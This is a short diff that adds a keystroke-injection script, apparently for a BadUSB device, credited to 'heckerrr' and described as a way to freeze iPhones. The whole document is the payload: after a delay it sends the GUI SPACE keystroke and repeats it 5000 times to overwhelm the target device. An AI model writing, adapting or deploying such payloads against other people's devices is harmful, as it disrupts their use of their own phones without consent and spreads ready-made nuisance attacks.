@@ -1,0 +1,4 @@
+REM Made by heckerrr, simple script that freezes up iPhones
+DELAY 10
+GUI SPACE
+REPEAT 5000
